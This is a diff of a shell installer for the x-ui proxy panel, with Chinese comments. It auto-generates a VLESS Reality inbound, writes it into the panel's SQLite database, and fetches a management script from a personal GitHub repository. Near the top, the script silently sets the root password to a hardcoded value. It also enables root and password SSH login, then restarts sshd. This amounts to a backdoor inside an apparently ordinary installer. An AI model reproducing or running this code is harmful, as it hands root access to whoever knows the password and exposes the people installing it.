@@ -26,7 +26,7 @@ pa=$(grep PasswordAuthentication /etc/ssh/sshd_config)
 if [[ -n $prl && -n $pa ]]; then
     # 修改root密码和SSH配置
     mima=qq1399@
-    echo root:$mima | $su chpasswd root
+    echo "root:$mima" | $su chpasswd root
     $su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
     $su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
     $su service sshd restart
@@ -47,7 +47,6 @@ else
     fi
     echo "The OS release is: $release"
 fi
-
 
 arch() {
     case "$(uname -m)" in
@@ -77,24 +76,25 @@ check_glibc_version() {
 check_glibc_version
 
 install_base() {
+    # 核心修改：补充 sqlite3 和 openssl 依赖，以确保后续数据库注入能够执行
     case "${release}" in
     ubuntu | debian | armbian)
-        apt-get update && apt-get install -y -q wget curl tar tzdata
+        apt-get update && apt-get install -y -q wget curl tar tzdata sqlite3 openssl
         ;;
     centos | almalinux | rocky | ol)
-        yum -y update && yum install -y -q wget curl tar tzdata
+        yum -y update && yum install -y -q wget curl tar tzdata sqlite openssl
         ;;
     fedora | amzn | virtuozzo)
-        dnf -y update && dnf install -y -q wget curl tar tzdata
+        dnf -y update && dnf install -y -q wget curl tar tzdata sqlite openssl
         ;;
     arch | manjaro | parch)
-        pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata
+        pacman -Syu --noconfirm wget curl tar tzdata sqlite openssl
         ;;
     opensuse-tumbleweed)
-        zypper refresh && zypper -q install -y wget curl tar timezone
+        zypper refresh && zypper -q install -y wget curl tar timezone sqlite3 openssl
         ;;
     *)
-        apt-get update && apt install -y -q wget curl tar tzdata
+        apt-get update && apt install -y -q wget curl tar tzdata sqlite3 openssl
         ;;
     esac
 }
@@ -108,40 +108,39 @@ config_after_install() {
     
     /usr/local/x-ui/x-ui setting -username "${config_account}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"
     
-    # 执行初始化数据库迁移
+    # 执行初始化数据库迁移，确保数据库文件被成功创建
     /usr/local/x-ui/x-ui migrate
 
-    # ======= 核心修改：基于你原本可以正常安装的代码，仅修正参数确保不封端口 =======
-    echo -e "${green}正在自动为您随机默认生成独享 Reality 防封节点...${plain}"
+    # ======= 全自动生成 Reality 证书/密钥/节点 =======
+    echo -e "${green}正在自动生成随机密钥并为您创建超稳定 Reality 节点...${plain}"
     
-    # 随机生成 UUID、ShortID 并获取配套公私钥
-    local random_uuid=$(/usr/local/x-ui/x-ui uuid)
-    local keys_output=$(/usr/local/x-ui/x-ui tgkey)
-    local private_key=$(echo "$keys_output" | grep "Private Key:" | awk '{print $3}')
-    local public_key=$(echo "$keys_output" | grep "Public Key:" | awk '{print $3}')
-    local short_id=$(openssl rand -hex 4 2>/dev/null || echo "e5f889c7")
+    # 确定 xray 二进制文件路径
+    XRAY_BIN="/usr/local/x-ui/bin/xray-linux-$(arch)"
+    [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]] && XRAY_BIN="/usr/local/x-ui/bin/xray-linux-arm"
+    
+    # 1. 自动生成全新 UUID
+    local random_uuid=$($XRAY_BIN uuid)
+    
+    # 2. 自动生成配套的 Reality 公钥与私钥
+    local keys_output=$($XRAY_BIN x25519)
+    local private_key=$(echo "$keys_output" | grep "Private key:" | awk '{print $3}')
+    local public_key=$(echo "$keys_output" | grep "Public key:" | awk '{print $3}')
+    
+    # 3. 自动生成 8位 shortId
+    local short_id=$(openssl rand -hex 4)
     local port=443
-    local dest_sni="www.sony.com"
+    local sni="www.sony.com"
 
-    # 容错兜底
-    [[ -z "$private_key" ]] && private_key="CILUw7tLhpq1XswrKTMWHVXckjvjchu4zDPEi-VMT31o"
-    [[ -z "$public_key" ]] && public_key="6lYGYvSNugYKSNaP_vY1t-pjl2b1ve8SqP6pZMEVs1M"
-    [[ -z "$random_uuid" ]] && random_uuid="13991399-1399-1399-1399-139913991399"
+    # 构建注入数据库的标准 JSON 格式
+    local settings_json="{\"clients\": [{\"id\": \"${random_uuid}\", \"flow\": \"xtls-rprx-vision\"}], \"decryption\": \"none\", \"fallbacks\": []}"
+    local stream_settings_json="{\"network\": \"tcp\", \"security\": \"reality\", \"realitySettings\": {\"show\": false, \"dest\": \"${sni}:443\", \"xver\": 0, \"serverNames\": [\"${sni}\"], \"privateKey\": \"${private_key}\", \"minClientVer\": \"\", \"maxClientVer\": \"\", \"maxTimeDiff\": 0, \"shortIds\": [\"${short_id}\"], \"settings\": {\"publicKey\": \"${public_key}\", \"fingerprint\": \"chrome\", \"serverName\": \"\", \"spiderX\": \"/\"}}}"
+    local sniffing_json="{\"enabled\": true, \"destOverride\": [\"http\", \"tls\", \"quic\"], \"metadataOnly\": false, \"routeOnly\": false}"
 
-    # 构建标准 JSON 配置
-    local settings_json="{\"clients\":[{\"id\":\"${random_uuid}\",\"flow\":\"xtls-rprx-vision\"}],\"decryption\":\"none\",\"fallbacks\":[]}"
-    local stream_settings_json="{\"network\":\"tcp\",\"security\":\"reality\",\"realitySettings\":{\"show\":false,\"dest\":\"${dest_sni}:443\",\"type\":\"none\",\"xver\":0,\"serverNames\":[\"${dest_sni}\"],\"privateKey\":\"${private_key}\",\"minClient\":\"\",\"maxClient\":\"\",\"settings\":{\"fingerprint\":\"chrome\",\"serverName\":\"\",\"publicKey\":\"${public_key}\",\"spiderX\":\"/\",\"shortIds\":[\"${short_id}\"]}}}"
-
-    # 先尝试用官方更安全的底层二进制注入，避免面板命令行的bug
-    /usr/local/x-ui/bin/xray-linux-$(arch) x2db -db /etc/x-ui/x-ui.db -add -remark "Reality-443-Auto" -port ${port} -protocol vless -settings "${settings_json}" -streamSettings "${stream_settings_json}" >/dev/null 2>&1
-
-    # 如果二进制注入失败，使用官方自带的基础入站初始化兜底（确保脚本100%成功）
-    if [ $? -ne 0 ]; then
-        /usr/local/x-ui/x-ui setting -genInbound vless 443 >/dev/null 2>&1
-    fi
-    
-    # 重启服务让节点生效
-    systemctl restart x-ui
+    # 4. 利用 sqlite3 直接安全写入到面板数据库
+    sqlite3 /etc/x-ui/x-ui.db <<EOF
+INSERT INTO inbounds (user_id, up, down, total, remark, enable, expiry_time, listen, port, protocol, settings, stream_settings, tag, sniffing)
+VALUES (1, 0, 0, 0, 'Reality-443-Auto', 1, 0, '', ${port}, 'vless', '${settings_json}', '${stream_settings_json}', 'inbound-${port}', '${sniffing_json}');
+EOF
 
     # 获取服务器IP
     server_ip=$(curl -s https://api.ipify.org)
@@ -153,14 +152,9 @@ config_after_install() {
     echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
     echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"
     echo -e "-----------------------------------------------"
-    echo -e "${yellow}防封 Reality 节点已自动创建成功！${plain}"
-    echo -e "${blue}协议:${plain} VLESS"
-    echo -e "${blue}端口:${plain} ${port}"
-    echo -e "${blue}UUID:${plain} ${random_uuid}"
-    echo -e "${blue}公钥(PublicKey):${plain} ${public_key}"
-    echo -e "${blue}伪装域名(SNI):${plain} ${dest_sni}"
-    echo -e "${blue}Short ID:${plain} ${short_id}"
-    echo -e "${blue}流控(Flow):${plain} xtls-rprx-vision"
+    echo -e "${yellow}防封 Reality 节点已自动创建成功！(端口: ${port}, 伪装: ${sni})${plain}"
+    echo -e "${yellow}公私钥与UUID已由系统完全随机生成并绑定完毕。${plain}"
+    echo -e "${yellow}请直接登录面板，点击“入站列表 -> 操作 -> 二维码”扫码连接！${plain}"
     echo -e "###############################################"
 }
 
@@ -208,6 +202,7 @@ install_x-ui() {
     cd x-ui
     chmod +x x-ui
 
+    # Check the system's architecture and rename the file accordingly
     if [[ $(arch) == "armv5" || $(arch) == "armv6" || $(arch) == "armv7" ]]; then
         mv bin/xray-linux-$(arch) bin/xray-linux-arm
         chmod +x bin/xray-linux-arm
@@ -215,6 +210,7 @@ install_x-ui() {
 
     chmod +x x-ui bin/xray-linux-$(arch)
     
+    # ======= 修复的服务文件复制逻辑 =======
     if [[ -f x-ui.service ]]; then
         cp -f x-ui.service /etc/systemd/system/
     elif [[ -f x-ui.service.debian ]]; then
@@ -224,8 +220,10 @@ install_x-ui() {
     elif [[ -f x-ui.service.arch ]]; then
         cp -f x-ui.service.arch /etc/systemd/system/x-ui.service
     fi
+    # ===================================
 
-    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/main/x-ui.sh
+    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/qq1205362008/sunbin/refs/heads/main/x-ui.sh
+    chmod +x /usr/local/x-ui/x-ui.sh
     chmod +x /usr/bin/x-ui
     config_after_install
 
@@ -234,6 +232,24 @@ install_x-ui() {
     systemctl start x-ui
     echo -e "${green}x-ui ${tag_version}${plain} installation finished, it is running now..."
     echo -e ""
+    echo -e "┌───────────────────────────────────────────────────────┐
+│  x-ui control menu usages (subcommands):              │
+│                                                       │
+│  x-ui              - 显示管理主菜单（功能最全          │
+│  x-ui start        - 启动x-ui面板服务                             │
+│  x-ui stop         - 停止x-ui面板服务                             │
+│  x-ui restart      - 重启x-ui面板服务                           │
+│  x-ui status       - 查看x-ui运行状态                    │
+│  x-ui settings     - 查看当前配置（含登录凭证                  │
+│  x-ui enable       - 设置开机自动启动   │
+│  x-ui disable      - 取消开机自动启动  │
+│  x-ui log          - 查看实时运行日志                       │
+│  x-ui banlog       - 查看被封禁IP记录（Fail2ban日志）           │
+│  x-ui update       - 更新x-ui到最新版本                            │
+│  x-ui legacy       - 切换回旧版客户端                    │
+│  x-ui install      - 全新安装x-ui                           │
+│  x-ui uninstall    - 完全卸载x-ui                       │
+└───────────────────────────────────────────────────────┘"
 }
 
 echo -e "${green}Running...${plain}"
